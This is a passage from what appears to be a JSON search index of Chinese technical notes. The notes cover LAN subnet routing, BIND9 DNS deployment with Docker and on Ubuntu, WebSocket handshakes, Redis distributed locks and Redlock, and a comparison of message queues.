采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。 URN URN是URL的一种更新形式，统一资源名称（Uniform Resource Name）。 唯一标识一个实体的标识符，但是不能给出实体的位置。 URN可以提供一种机制，用于查找和检索定义特定命名空间的架构文件。 尽管普通的URL可以提供类似的功能，但是URN更强大更容易管理，因为它可以引用多个URL。","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-UPNP-part-of-the-field-term-introduction.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-UPNP-part-of-the-field-term-introduction.html"},{"title":"UPnP","text":"","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-index.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-index.html"},{"title":"局域网内跨网段访问","text":"方法一:路由器配置路由 如果需要允许多个网段互相访问，您可以按照以下步骤设置路由器： 登录路由器管理控制台 打开您的浏览器，输入默认网关的 IP 地址。 通常情况下，路由器的默认地址为 192.168.1.1 或 192.168.0.1。 输入管理员用户名和密码以登录到路由器管理界面。 创建静态路由 在路由器管理控制台中，找到\"路由设置\"或\"网络设置\"等选项，并单击它。 然后，单击\"添加路由\"或\"创建路由规则\"等按钮。 在路由设置页面中，您需要创建一条静态路由来允许不同子网之间的通信。 具体操作取决于您使用的路由器型号和软件版本，但通常可参考以下配置: 目标网络：目标子网地址 子网掩码：目标子网掩码 下一跳地址：连接到目标子网的设备 IP 地址 接口：LAN或WAN 将\"下一跳地址\"替换为连接到目标子网的设备的 IP 地址。 例如，如果您要连接到 192.168.2.0 子网，该子网的网关 IP 地址为 192.168.1.2，则应将下一跳地址设置为 192.168.1.2。 最后，单击\"保存\"或\"应用\"按钮。 配置防火墙 如果您的路由器上启用了防火墙，则需要配置防火墙以允许所有子网之间的通信。 在路由器管理控制台中，找到\"防火墙设置\"或\"安全设置\"等选项，并单击它。 然后，找到\"访问控制列表\"、\"端口转发\"或\"虚拟服务器\"等选项，并单击\"添加规则\"或\"新建\"等按钮。 具体操作取决于您使用的路由器型号和软件版本，但通常可参考以下配置: 协议：全部或TCP/UDP 来源IP：源子网地址 目标IP：目标子网地址 目标端口：全部或指定端口 动作：允许 请将\"源IP\"替换为源子网的 IP 地址范围，\"目标IP\"替换为目标子网的 IP 地址范围。最后，单击\"保存\"或\"应用\"按钮。 问题 可能会降低网络安全性 如果需要允许很多子网之间的互相访问，手动配置静态路由和防火墙规则可能会非常麻烦。为了简化这个过程，您可以考虑以下两种方法： 使用动态路由协议 动态路由协议可以自动学习和更新路由表，从而优化网络通信。 例如，您可以使用OSPF（开放式最短路径优先）或BGP（边界网关协议）等路由协议来管理多个子网之间的通信。 通过动态路由协议，路由器可以自动发现新的网络和路由，无需手动配置每个子网的路由。 使用SDN（软件定义网络） SDN将网络控制分离出来，使业务能够以集中的方式管理网络。 它提供了专门的控制器来管理路由和策略，并允许管理员随时更改网络配置。 通过SDN，您可以轻松地添加、删除或修改路由和防火墙规则，同时优化网络性能和可靠性。 方法二:VPN","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-Visit-of-cross--net-section-of-the-local-area-network.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-Visit-of-cross--net-section-of-the-local-area-network.html"},{"title":"docker使用ubuntu/bind部署dns服务","text":"使用的镜像: ubuntu/bind9 创建容器: mkdir -p dns_config docker run -d --name bind9-dns-server -e TZ=UTC -p 30053:53 -v dns_config:/data ubuntu/bind9:9.18-22.04_beta 后面方式基本与 : ubuntu配置dns 一致 其他 具有管理面板的docker-bind: 使用Docker搭建自己的DNS服务器","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-Docker-uses-Bind-to-deploy-the-DNS-service.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-Docker-uses-Bind-to-deploy-the-DNS-service.html"},{"title":"docker使用bind部署dns服务-管理面板","text":"使用的镜像: sameersbn/bind 使用bind镜像创建: # 创建一个持久化存放文件的目录 mkdir -p sameersbn/bind # 使用容器创建应用 # --restart=always docker run --name bind -d \\ --publish 53:53/tcp --publish 53:53/udp --publish 10000:10000/tcp \\ --volume /Users/yanque/project/docker/sameersbn/bind:/data \\ sameersbn/bind:9.16.1-20200524 若需要外网访问, 注意开放53的tcp与udp端口 在本机浏览器打开: https://localhost:10000 , 默认账户密码root/password登录, 然后更改语言为中文. 更新语言为中文 创建新的主区域 填写域名, 邮箱, 然后点击新建 选择地址, 然后填写前缀名称与ip (本机ip) 更新本机dns (本机ip) 技巧 如果是在本机使用, 可以直接写 127.0.0.1 访问公网: # vim sameersbn/bind/bind/etc/resolv.conf nameserver 114.114.114.114 nameserver 8.8.8.8 # vim sameersbn/bind/bind/etc/named.conf.options # 添加一行，内容如下： allow-query { any; }; 重启一下服务，执行以下命令，这样才能使用配置生效: docker restart bind 测试, 访问 自己设置的地址 http://doc.yanquer.com : 访问 其他 具有管理面板的docker-bind: 使用Docker搭建自己的DNS服务器","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-docker-bind-deploy-DNS-management-panel.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-docker-bind-deploy-DNS-management-panel.html"},{"title":"自建局域网dns服务器","text":"完全限定域名(FQDN) = 主机名 + 域名. 例: www.baidu.com = www(主机) + baidu.com(域名) 本机解析寻找顺序: 本机host文件 -> dns服务器 DNS解析方式: 正向解析 FQDN -> IP 反向解析 IP -> FQDN 环境搭建 准备一个主机服务器, 设置静态ip, 注意保证使用的机器与此机器在同一个网段 打开windows功能管理, 安装 DNS服务器 打开: 服务器管理 -〉工具 -> DNS服务器 ubuntu配置dns服务器 /docs/杂乱无章/计算机网络/config_dns/ubuntu配置dns 其他部署方式 Docker部署bind: /docs/杂乱无章/计算机网络/config_dns/docker使用bind部署dns服务 Linux使用bind: /docs/杂乱无章/计算机网络/config_dns/ubuntu配置dns (debian也可) 综合","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-index.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-index.html"},{"title":"ubuntu配置dns服务器","text":"配置dns服务器 为了方便直接使用docker部署, 先配置一个dns机器(后续以 myubuntu_dns_server 代称): # 默认latest版本是 20版本的 focal docker pull ubuntu docker run --name myubuntu_dns_server -itd ubuntu 然后就部署好一个ubuntu服务器了, 进入: docker exec -it myubuntu_dns_server /bin/bash 配置apt源: # 安装证书验证模块才可以配置源 apt update && apt install ca-certificates mv /etc/apt/sources.list /etc/apt/sources.list.bak echo \"deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse \" > /etc/apt/sources.list apt update && apt install vim # 安装查看ip工具 apt install iproute2 查看ip为 172.17.0.5 ip a | grep inet 配置普通机器(可选) 再按照上述方式安装一个测试机器(后续以 myubuntu_g1 代称), 验证dns配置是否正确: docker run --name myubuntu_g1 -itd ubuntu # 参考上面 ... # 查看ip为 172.17.0.4 ip a | grep inet # 安装 bind9-utils 以使用host apt install bind9-utils host dns-server继续配置 实际还应该固定此服务器ip为静态ip, 此处docker部署忽略. dns服务器(myubuntu_dns_server)安装bind9(目前市面是最主流的开源DNS软件) apt install bind9 bind9默认会有一些配置文件, 参见 /docs/操作系统/linux/package/bind9软件包 配置option 配置option: // 允许进行普通查询的 IP 地址列表，默认允许所有； sed -ie \"3a \\ \\ \\ \\ \\ \\ \\ \\ listen-on port 53 { ${ip}; }; allow-query { any; }; \" /etc/bind/named.conf.options 其实就是加上: listen-on port 53 { ${ip}; }; allow-query { any; }; 其中 listen-on 必须配置, 让named知道监听的端口与地址. allow-query 是默认 any 可以忽略 配置正向解析 若配置type为slave 若需要配置从服务器, 格式参考下面配置: zone \"aaa.com\" IN { type slave; // 从模式 masters { 172.17.0.5; }; // 主服务器的IP file \"slaves/aaa.localhost\"; allow-update { none; }; }; 在 /etc/bind/named.conf.local 添加以下内容: zone \"study.edu\" IN { type master; file \"/var/cache/bind/named.study.com\"; }; 表示配置一个 study.edu 域名, 作为master, 配置文件在 /var/cache/bind/named.study.com 技巧 可直接: cp /etc/bind/db.local /var/cache/bind/named.study.com 然后修改 现在配置 /var/cache/bind/named.study.com ; ; BIND data file for study.com ; $TTL 604800 @ IN SOA study.com. root.study.com. ( 2 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS localhost. @ IN A 172.17.0.4 @ IN AAAA ::1 ; A 表示ipv4地址 AAAA表示ipv6地址 NS表示使用的dns服务器 ; www 会自动加到 study.com. 实际为 www.study.com www IN A 172.17.0.4 ; qq 会自动加到 study.com. 实际为 qq.study.com qq IN A 172.17.0.6 警告 这种解析配置文件需要注意空格问题, 切记 否则可能会出现这种问题: Host 5.0.17.172.in-addr.arpa not found: 2(SERVFAIL) 重启 bind9: /etc/init.d/named restart 测试: root@e376019130d3:/# host www.study.edu 172.17.0.5 Using domain server: Name: 172.17.0.5 Address: 172.17.0.5#53 Aliases: www.study.edu has address 172.17.0.4 root@e376019130d3:/# root@e376019130d3:/# root@e376019130d3:/# host qq.study.edu 172.17.0.5 Using domain server: Name: 172.17.0.5 Address: 172.17.0.5#53 Aliases: qq.study.edu has address 172.17.0.6 配置反向解析 警告 多次配置不同的反向代理, 不用重复写 /etc/bind/named.conf.local 下的 zone \"0.17.172.in-addr.arpa\" 在 /etc/bind/named.conf.local 增加以下内容: zone \"0.17.172.in-addr.arpa\" { type master; file \"/var/cache/bind/named.reverse.db.xxx\"; }; 技巧 可直接: cp /etc/bind/db.127 /var/cache/bind/named.reverse.db.xxx 然后修改 现在配置 /var/cache/bind/named.reverse.db.xxx ; ; BIND reverse data file for 172.17.0 ; $TTL 604800 @ IN SOA study.com. admin.study.com. ( 1 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS study.com. ; 表示 172.17.0.5 会被解析为 study.com. 注意这里都是倒着来 5 IN PTR study.com. 重启: /etc/init.d/named restart 测试反向解析: root@e376019130d3:/# root@e376019130d3:/# host 172.17.0.5 172.17.0.5 Using domain server: Name: 172.17.0.5 Address: 172.17.0.5#53 Aliases: 5.0.17.172.in-addr.arpa domain name pointer study.com. root@e376019130d3:/# 技巧 配置dns解析在 /etc/resolv.conf 文件, 作用等同于上面的 172.17.0.5 , 若存在相应配置就, 上述命令可以不用写此IP 设置为DNS缓存服务器 在 /etc/bind/named.conf.options 增加以下内容: allow-query { any; }; allow-query-cache { any; }; // 允许查询缓存的IP地址列表； recursion yes; // 允许递归查询； allow-recursion { any; }; // 允许递归查询的IP地址列表； forward only; // 允许转发； forwarders { 172.17.0.5; }; // 转发列表，172.17.0.5 为前面配置的授权服务器； dnssec-validation no; // 关闭 dnssec； 重启bind9: /etc/init.d/named restart 验证: # 清除dns缓存 rndc flush # +norecurse 不允许递归查询 dig @172.17.0.4 www.study.com A +norecurse # 在授权服务器上抓包 tcpdump -i eth1 port 53 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes &#94;C 0 packets captured 0 packets received by filter 0 packets dropped by kernel 然后再基于允许递归查询抓包, 可以看出 缓存服务器向授权服务器进行递归查询. 不允许递归查询时，DNS 缓存服务器会将缓存结果发送给客户端. 此部分缓存参考:: Bind9：配置 DNS 授权服务器和 DNS 缓存服务器 附, 基础配置脚本, 功能: 配置本机为dns授权服务器","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-ubuntu-configuration-DNS.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-ubuntu-configuration-DNS.html"},{"title":"计算机网络","text":"协议","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-index.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-index.html"},{"title":"websocket","text":"url表示常以 ws 开头, 或 wss 开头, 如: wss://127.0.0.1:8080/ ws 与 wss 区别就是后者多了个加密, 就像 http 与 https 一样 包含的消息头 Sec-Websocket-key WebSocket握手过程中的一个关键消息头. 标识这是一个WebSocket连接请求,而不是普通的HTTP请求 用来计算Sec-WebSocket-Accept的值,以验证连接. 在WebSocket握手时,客户端发送一个请求到服务器,请求中包含一个随机生成的Sec-WebSocket-Key. 服务器收到这个key后,需要按照一定算法计算出一个hash值,放到Sec-WebSocket-Accept响应头中返回给客户端. 客户端收到响应后,会用相同的算法计算hash值,并比对是否和服务器返回的一致。如果一致,则说明服务器支持WebSocket,握手成功. 这个过程可以防止普通HTTP客户端意外接入WebSocket服务器.","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-websocket.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-websocket.html"},{"title":"分布式锁","text":"参考: Redis 分布式锁的正确实现原理演化历程与 Redisson 实战总结 分布式锁应该满足哪些特性 互斥：在任何给定时刻，只有一个客户端可以持有锁； 无死锁：任何时刻都有可能获得锁，即使获取锁的客户端崩溃； 容错：只要大多数 Redis的节点都已经启动，客户端就可以获取和释放锁。 如何设置? 普通排他锁 利用 /docs/数据库/redis/redis 的特性: 使用 SETNX key value 命令是实现「互斥」特性 如获取一个订单锁: 127.0.0.1:6379> setnx lock:order_1 1 (integer) 1 重复获取就失败: 127.0.0.1:6379> setnx lock:order_1 2 (integer) 0 但是会存在一个问题, 会出现如果客户端异常, 锁无法释放, 就会有死锁. 这个时候可以设置超时, 如30秒过期: 127.0.0.1:6379> expire lock:order_1 30 (integer) 1 但是这样写有个问题, 因为是两个命令, 不能保证同时执行成功(原子性) 所有可以这样写: 127.0.0.1:6379> set lock:order_1 1 NX EX 30 OK 这样写还不够，我们还要防止不能释放不是自己加的锁, 比如是A设置的, B给del了. 考虑以下场景: A 获取锁成功并设置设置 30 秒超时； A 因为一些原因导致执行很慢（网络问题、发生 FullGC……），过了 30 秒依然没执行完，但是锁过期「自动释放了」； B 申请加锁成功； A 执行完成，执行 DEL 释放锁指令，这个时候就把 B 的锁给释放了。 有个关键问题需要解决：自己的锁只能自己来释放 这个时候可以从value上入手, 比如设置其前缀为自己的标识, del前检查一下是不是自己的锁 这个时候已经比较完美了, 一般都是如此使用 正确设置锁超时 锁的超时时间怎么计算合适呢？ 这个时间不能瞎写，一般要根据在测试环境多次测试，然后压测多轮之后，比如计算出平均执行时间 200 ms。 那么锁的超时时间就放大为平均执行时间的 3~5 倍。 为啥要放放大呢？ 因为如果锁的操作逻辑中有网络 IO 操作、JVM FullGC 等，线上的网络不会总一帆风顺，我们要给网络抖动留有缓冲时间。 那我设置更大一点，比如设置 1 小时不是更安全？ 不要钻牛角，多大算大？ 设置时间过长，一旦发生宕机重启，就意味着 1 小时内，分布式锁的服务全部节点不可用。 你要让运维手动删除这个锁么？ 只要运维真的不会打你。 有没有完美的方案呢？不管时间怎么设置都不大合适。 我们可以让获得锁的线程开启一个守护线程，用来给快要过期的锁「续航」。 加锁的时候设置一个过期时间，同时客户端开启一个「守护线程」，定时去检测这个锁的失效时间。 如果快要过期，但是业务逻辑还没执行完成，自动对这个锁进行续期，重新设置过期时间。 这个道理行得通，可我写不出。 别慌，已经有一个库把这些工作都封装好了他叫 Redisson . 在使用分布式锁时，它就采用了 自动续期 的方案来避免锁过期，这个守护线程我们一般也把它叫做 看门狗 线程。 一路优化下来，方案似乎比较「严谨」了，抽象出对应的模型如下 通过 SET lock_resource_name random_value NX EX expire_time，同时启动守护线程为快要过期但还没执行完的客户端的锁续命; 客户端执行业务逻辑操作共享资源； 通过脚本释放锁，先 get 判断锁是否是自己加的，再执行 DEL。 但是还是有以下问题 可重入锁如何实现？ 主从架构崩溃恢复导致锁丢失如何解决？ 客户端加锁的位置有门道么？ 实现可重入锁 当一个线程执行一段代码成功获取锁之后，继续执行时， 又遇到加锁的代码，可重入性就就保证线程能继续执行， 而不可重入就是需要等待锁释放之后，再次获取锁成功，才能继续往下执行。 Redis Hash 可重入锁 Redisson 类库就是通过 Redis Hash 来实现可重入锁 当线程拥有锁之后，往后再遇到加锁方法，直接将加锁次数加 1，然后再执行方法逻辑。 退出加锁方法之后，加锁次数再减 1，当加锁次数为 0 时，锁才被真正的释放。 可以看到可重入锁最大特性就是计数，计算加锁的次数。 所以当可重入锁需要在分布式环境实现时，我们也就需要统计加锁次数。 大致逻辑: 首先 Redis exists 命令判断当前 lock 这个锁是否存在 如果锁不存在的话，直接使用 hincrby 创建一个键为 lock hash 表， 并且为 Hash 表中键为 uuid 初始化为 0，然后再次加 1，最后再设置过期时间 如果当前锁存在，则使用 hexists 判断当前 lock 对应的 hash 表中是否存在 uuid 这个键， 如果存在，再次使用 hincrby 加 1，最后再次设置过期时间 最后如果上述两个逻辑都不符合，说明别人拿了锁. 主从架构带来的问题 之前分析的场景都是，锁在「单个」Redis 实例中可能产生的问题，并没有涉及到 Redis 主从模式导致的问题。 我们通常使用「Cluster 集群」或者「哨兵集群」的模式部署保证高可用。 这两个模式都是基于「主从架构数据同步复制」实现的数据同步，而 Redis 的主从复制默认是异步的。 以下内容来自于官方文档 Redis官方 我们试想下如下场景会发生什么问题： 客户端 A 在 master 节点获取锁成功。 还没有把获取锁的信息同步到 slave 的时候，master 宕机。 slave 被选举为新 master，这时候没有客户端 A 获取锁的数据。 客户端 B 就能成功的获得客户端 A 持有的锁，违背了分布式锁定义的互斥。 虽然这个概率极低，但是我们必须得承认这个风险的存在。 ❝Redis 的作者提出了一种解决方案，叫 Redlock（红锁） Redis 的作者为了统一分布式锁的标准，搞了一个 Redlock， 算是 Redis 官方对于实现分布式锁的指导规范, Redis官方 , 但是这个 Redlock 也被国外的一些分布式专家给喷了。 因为它也不完美，有\"漏洞\"。 什么是 Redlock 可以看官方文档( Redis官方 )，以下来自官方文档的翻译。 想用使用 Redlock，官方建议在不同机器上部署 5 个 Redis 主节点， 节点都是完全独立，也不使用主从复制，使用多个节点是为容错。 一个客户端要获取锁有 5 个步骤： 客户端获取当前时间 T1（毫秒级别）； 使用相同的 key和 value顺序尝试从 N个 Redis实例上获取锁。 每个请求都设置一个超时时间（毫秒级别），该超时时间要远小于锁的有效时间，这样便于快速尝试与下一个实例发送请求。 比如锁的自动释放时间 10s，则请求的超时时间可以设置 5~50 毫秒内，这样可以防止客户端长时间阻塞。 客户端获取当前时间 T2 并减去步骤 1 的 T1 来计算出获取锁所用的时间（T3 = T2 -T1）。 当且仅当客户端在大多数实例（N/2 + 1）获取成功，且获取锁所用的总时间 T3 小于锁的有效时间，才认为加锁成功，否则加锁失败。 如果第 3 步加锁成功，则执行业务逻辑操作共享资源， key 的真正有效时间等于有效时间减去获取锁所使用的时间（步骤 3 计算的结果）。 如果因为某些原因，获取锁失败（没有在至少 N/2+1 个 Redis 实例取到锁或者取锁时间已经超过了有效时间）， 客户端应该在所有的 Redis 实例上进行解锁（即便某些 Redis 实例根本就没有加锁成功）。 另外部署实例的数量要求是奇数，为了能很好的满足过半原则， 如果是 6 台则需要 4 台获取锁成功才能认为成功，所以奇数更合理 事情可没这么简单，Redis 作者把这个方案提出后，受到了业界著名的分布式系统专家的质疑。 两人好比神仙打架，两人一来一回论据充足的对一个问题提出很多论断……: • Martin Kleppmann 提出质疑的博客：https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html • Redlock 设计者的回复：http://antirez.com/news/101 Redlock 是与非 Martin Kleppmann 认为锁定的目的是为了保护对共享资源的读写，而分布式锁应该「高效」和「正确」 高效性：分布式锁应该要满足高效的性能，Redlock 算法向 5 个节点执行获取锁的逻辑性能不高，成本增加，复杂度也高； 正确性：分布式锁应该防止并发进程在同一时刻只能有一个线程能对共享数据读写。 出于这两点，我们没必要承担 Redlock 的成本和复杂，运行 5 个 Redis 实例并判断加锁是否满足大多数才算成功。 主从架构崩溃恢复极小可能发生，这没什么大不了的。使用单机版就够了，Redlock 太重了，没必要。 Martin 认为 Redlock 根本达不到安全性的要求，也依旧存在锁失效的问题！ Martin 的结论 Redlock 不伦不类：对于偏好效率来讲，Redlock 比较重，没必要这么做，而对于偏好正确性来说，Redlock 是不够安全的。 时钟假设不合理：该算法对系统时钟做出了危险的假设（假设多个节点机器时钟都是一致的），如果不满足这些假设，锁就会失效。 无法保证正确性：Redlock 不能提供类似 fencing token 的方案，所以解决不了正确性的问题。为了正确性，请使用有「共识系统」的软件，例如 Zookeeper。 Redis 作者 Antirez 的反驳 在 Redis 作者的反驳文章中，有 3 个重点： 时钟问题：Redlock 并不需要完全一致的时钟，只需要大体一致就可以了，允许有「误差」， 只要误差不要超过锁的租期即可，这种对于时钟的精度要求并不是很高，而且这也符合现实环境。 网络延迟、进程暂停问题： 客户端在拿到锁之前，无论经历什么耗时长问题，Redlock 都能够在第 3 步检测出来 客户端在拿到锁之后，发生 NPC，那 Redlock、Zookeeper 都无能为力 质疑 fencing token 机制。 Redisson 分布式锁","tags":"中间件","url":"/yq-doc-source-docs-Chaotic-middleware-Distributed-lock.html","loc":"/yq-doc-source-docs-Chaotic-middleware-Distributed-lock.html"},{"title":"Dubbo","text":"一个RPC框架 注册中心 服务注册 服务发现","tags":"中间件","url":"/yq-doc-source-docs-Chaotic-middleware-Dubbo.html","loc":"/yq-doc-source-docs-Chaotic-middleware-Dubbo.html"},{"title":"RocketMQ","text":"如何避免消息丢失 方案一：同步发送＋多次重试 DefaultMQProducer发送消息的方式 单向发送：消息发出去就不管了 同步发送：同步等待Broker响应 异步发送：异步处理Broker通知 重试队列与死信队列保证消息安全 方案二：RocketMQ提供的事务消息机制 TransactionMQProducer + TransactionListenerImpl 实现事务消息发送 关于缓存写到磁盘 RocketMQ 同步刷盘, 每10毫秒进行一次刷盘; 异步刷盘， 如果是堆内内存，可以设定刷盘的间隔; 堆外内存，只管写入pagecache，由操作系统进行刷盘。 注解 pagecache 指内核态的页缓存 整个链路保障消息一致 如果每一个地方都要保障消息不丢失, 性能会下降, 甚至还不如不用MQ. 所以, 综合考虑使用场景...","tags":"中间件","url":"/yq-doc-source-docs-Chaotic-middleware-Mq-Rocketmq.html","loc":"/yq-doc-source-docs-Chaotic-middleware-Mq-Rocketmq.html"},{"title":"MQ","text":"主要是适用于分布式微服务场景下的, 单体小业务用不到. 消息队列（Message Queue，简称MQ）指保存消息的一个容器，其实本质就是一个保存数据的队列; 消息中间件是指利用高效可靠的消息传递机制进行与平台无关的数据交流，并基于数据通信来进行分布式系统的构建 消息中间件是分布式系统中重要的组件，主要解决应用解耦，异步消息，流量削峰等问题， 实现高性能，高可用，可伸缩和最终一致性的系统架构。 目前使用较多的消息队列有ActiveMQ，RabbitMQ，ZeroMQ，Kafka，MetaMQ，RocketMQ等。 主要用途 解耦 将原来单体量应用拆分为分布式微服务架构, 通过MQ消息队列通信, 提高可维护性. 系统之间耦合转移为与MQ的耦合 异步 避免完全串行化, 提高效率 削峰 当某个时段请求量, 并发量大时, 给到消息队列里面去, 慢慢处理, 不至于被搞挂掉. 异步解耦举例 在正常业务流程中，比较耗时而且不需要即时返回结果的操作。 将这些操作可以做为「异步处理」，这样可以大大的加快请求的响应时间。 最常见的场景就是用户注册之后，需要发送注册短信、邮件通知，以告知相关信息。 正常做法，是要经过三大步处理：用户信息处理、发送邮件、发送短信， 等这三步全部都完成之后，才返回前端，告诉你注册成功了。 使用MQ，只需要在处理完用户信息之后， 给MQ发送两个消息即可，邮件服务、短信服务监听MQ的任务消息，根据消息进行发送即可。 解耦微服务举例 还是用户注册的例子，将用户注册、邮件/短信发送理解为两个独立的微服务，就非常好理解 流量削峰填谷 控制流量，也是MQ比较常用的一个场景，一般在秒杀、搞活动中使用广泛。 这个时候一般用户请求量会激增，可能会远超当前系统的最大处理量，如果不做任何处理，系统可能就会宕掉。 使用MQ，可以将需要处理的消息全部放入其中，系统按照最大处理能力， 去获取消息进行消费，这样就可以将一瞬间过来的请求，分散到一段时间内进行处理，避免了系统的崩溃。 消息分发 这个也挺常用。多个系统对同一个数据感兴趣，只需要监听同一类消息即可。 例如付款系统，在付款成功之后，正常做法是通知外围系统这个单子付款成功了， 或者是外围系统定时来拉取付款结果， 使用MQ后，付款系统可以在付款成功之后，将消息放到MQ里面， 想知道这个结果的系统订阅这个主题的消息即可，非常方便，也不需要定时去拉取数据了。 事务消息发送步骤如下 发送方将半事务消息发送至消息队列RocketMQ。 消息队列RocketMQ将消息持久化成功之后，向发送方返回Ack确认消息已经发送成功，此时消息为半事务消息。 发送方开始执行本地事务逻辑。 发送方根据本地事务执行结果向服务端提交二次确认（Commit或是Rollback）， 服务端收到Commit状态则将半事务消息标记为可投递，订阅方最终将收到该消息； 服务端收到Rollback状态则删除半事务消息，订阅方将不会接受该消息。 事务消息回查步骤如下： 在断网或者是应用重启的特殊情况下， 上述步骤4提交的二次确认最终未到达服务端，经过固定时间后服务端将对该消息发起消息回查。 发送方收到消息回查后，需要检查对应消息的本地事务执行的最终结果。 发送方根据检查得到的本地事务的最终状态再次提交二次确认，服务端仍按照步骤4对半事务消息进行操作。 缺点 系统可用性降低 系统可用性在某种程度上降低。在加入MQ之前， 你不用考虑消息丢失或者说MQ挂掉等等的情况，但是，引入MQ之后你就需要去考虑了！ 系统复杂性提高 重复消费、消息丢失、消息的顺序消费等等，反正用了之后就是贼烦。 数据一致性 分布式服务本身就存在的一个问题，不仅仅是消息队列的问题， 但是放在这里说是因为用了消息队列这个问题会暴露得比较严重一点 有一个解决方案是 分布式事务 : 把相关操作如 下单，优惠券，积分。。。 都放在一个事务里面一样，要成功一起成功，要失败一起失败。 消息队列MQ设计 大致流程: Producer ----send----> Broker ----receive----> Consumer 消息存储 --消息消费--> <--消息确认-- 消息备份/删除 Producer 消息生产者：负责产生和发送消息到 Broker； Broker 消息处理中心：负责消息存储、确认、重试等，一般其中会包含多个 queue； Consumer 消息消费者：负责从 Broker 中获取消息，并进行相应处理； 分类 Kafka ActiveMQ RabbitMQ RocketMQ 等这几种 ActiveMQ和RabbitMQ这两着因为吞吐量还有GitHub的社区活跃度的原因， 在各大互联网公司都已经基本上绝迹了， 业务体量一般的公司会是有在用的， 但是越来越多的公司更青睐RocketMQ这样的消息中间件了。 没有最好的技术，只有最适合的技术，不要为了用而用 ActiveMQ 优点 单机吞吐量：万级 时效性：ms级 可用性：高，基于主从架构实现高可用性 消息可靠性：有较低的概率丢失数据 功能支持：MQ领域的功能极其完备 缺点: 官方社区现在对ActiveMQ 5.x维护越来越少，较少在大规模吞吐的场景中使用。 Kafka 号称大数据的杀手锏，谈到大数据领域内的消息传输，则绕不开Kafka， 这款为大数据而生的消息中间件，以其百万级TPS的吞吐量名声大噪， 迅速成为大数据领域的宠儿，在数据采集、传输、存储的过程中发挥着举足轻重的作用。 Apache Kafka它最初由LinkedIn公司基于独特的设计实现为 一个分布式的提交日志系统( a distributed commit log)，之后成为Apache项目的一部分。 目前已经被LinkedIn，Uber, Twitter, Netflix等大公司所采纳。 优点 性能卓越，单机写入TPS约在百万条/秒(集群, 单机只有十万)，最大的优点，就是吞吐量高。 时效性：ms级 可用性：非常高，kafka是分布式的，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用 消费者采用Pull方式获取消息, 消息有序, 通过控制能够保证所有消息被消费且仅被消费一次; 有优秀的第三方Kafka Web管理界面Kafka-Manager； 在日志领域比较成熟，被多家公司和多个开源项目使用； 功能支持：功能较为简单，主要支持简单的MQ功能，在大数据领域的实时计算以及日志采集被大规模使用 缺点： Kafka单机超过64个队列/分区，Load会发生明显的飙高现象，队列越多，load越高，发送消息响应时间变长 使用短轮询方式，实时性取决于轮询间隔时间； RabbitMQ RabbitMQ 2007年发布，是一个在AMQP(高级消息队列协议)基础上完成的， 可复用的企业消息系统，是当前最主流的消息中间件之一。 RabbitMQ优点： 由于erlang语言的特性，mq 性能较好，高并发； 吞吐量到万级，MQ功能比较完备 健壮、稳定、易用、跨平台、支持多种语言、文档齐全； 开源提供的管理界面非常棒，用起来很好用 社区活跃度高； RabbitMQ缺点： erlang开发，很难去看懂源码，基本只依赖于开源社区的快速维护和修复bug，不利于做二次开发和维护。 RabbitMQ确实吞吐量会低一些，这是因为他做的实现机制比较重。 需要学习比较复杂的接口和协议，学习和维护成本较高。 RocketMQ RocketMQ出自 阿里公司的开源产品，用 Java 语言实现，在设计时参考了 Kafka，并做出了自己的一些改进。 RocketMQ在阿里集团被广泛应用在订单，交易，充值，流计算，消息推送，日志流式处理，binglog分发等场景。 RocketMQ优点： 单机吞吐量：十万级 可用性：非常高，分布式架构 消息可靠性：经过参数优化配置，消息可以做到0丢失 功能支持：MQ功能较为完善，还是分布式的，扩展性好 支持10亿级别的消息堆积，不会因为堆积导致性能下降 源码是java，我们可以自己阅读源码，定制自己公司的MQ，可以掌控 RocketMQ缺点： 支持的客户端语言不多，目前是java及c++，其中c++不成熟； 社区活跃度一般 没有在 mq 核心中去实现JMS等接口，有些系统要迁移需要修改大量代码 消息队列选择建议 Kafka Kafka主要特点是基于Pull的模式来处理消息消费，追求高吞吐量， 一开始的目的就是用于日志收集和传输，适合产生大量数据的互联网服务的数据收集业务。 大型公司建议可以选用，如果有日志采集功能，肯定是首选kafka了。 RocketMQ 天生为金融互联网领域而生，对于可靠性要求很高的场景， 尤其是电商里面的订单扣款，以及业务削峰，在大量交易涌入时，后端可能无法及时处理的情况。 RoketMQ在稳定性上可能更值得信赖，这些业务场景在阿里双11已经经历了多次考验， 如果你的业务有上述并发场景，建议可以选择RocketMQ。 RabbitMQ 